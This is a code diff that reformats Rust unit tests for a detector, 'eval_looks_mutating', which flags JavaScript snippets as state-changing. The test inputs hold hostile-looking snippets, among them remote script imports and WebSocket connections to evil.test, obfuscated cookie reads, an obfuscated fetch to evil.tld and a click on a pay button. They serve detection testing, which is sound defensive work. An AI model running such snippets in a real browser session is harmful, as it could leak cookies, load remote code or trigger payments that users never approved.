@@ -1811,7 +1811,9 @@ mod tests {
         assert!(eval_looks_mutating(
             "() => HTMLFormElement.prototype.submit.call(form)"
         ));
-        assert!(eval_looks_mutating("() => Reflect.set(location, 'href', 'x')"));
+        assert!(eval_looks_mutating(
+            "() => Reflect.set(location, 'href', 'x')"
+        ));
         assert!(eval_looks_mutating("() => history.back()"));
         assert!(eval_looks_mutating(
             "() => location.assign('https://evil.test')"
@@ -1829,13 +1831,19 @@ mod tests {
         assert!(eval_looks_mutating(
             "() => document.querySelector('#pay')?.click?.()"
         ));
-        assert!(eval_looks_mutating("() => import('https://evil.test/x.js')"));
-        assert!(eval_looks_mutating("() => new WebSocket('wss://evil.test')"));
+        assert!(eval_looks_mutating(
+            "() => import('https://evil.test/x.js')"
+        ));
+        assert!(eval_looks_mutating(
+            "() => new WebSocket('wss://evil.test')"
+        ));
         assert!(eval_looks_mutating("() => document['coo'+'kie']"));
         assert!(eval_looks_mutating(
             "() => window[String.fromCharCode(102,101,116,99,104)]('https://evil.tld')"
         ));
-        assert!(eval_looks_mutating("() => Reflect.apply(HTMLElement.prototype.click, el, [])"));
+        assert!(eval_looks_mutating(
+            "() => Reflect.apply(HTMLElement.prototype.click, el, [])"
+        ));
     }
 
     #[test]
